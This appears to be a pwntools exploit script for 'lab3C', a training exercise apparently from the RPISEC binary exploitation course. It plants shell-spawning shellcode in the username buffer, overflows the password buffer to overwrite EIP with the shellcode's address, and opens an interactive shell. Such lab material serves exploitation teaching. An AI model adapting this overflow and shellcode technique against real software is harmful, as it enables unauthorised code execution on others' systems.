from pwn import *
pwnlib.args.SILENT('SILENT')

p = process('./lab3C')

# Store shellcode in BSS (it's executable)
username = 'rpisec'
username += asm(shellcraft.linux.sh())
username += asm(shellcraft.linux.exit())

# Overwrite $eip using password
password = 'A' * 80
password += p32(0x8049c40 + len('rpisec'))

# Send and interact!
p.sendline(username)
p.sendline(password)
p.interactive()
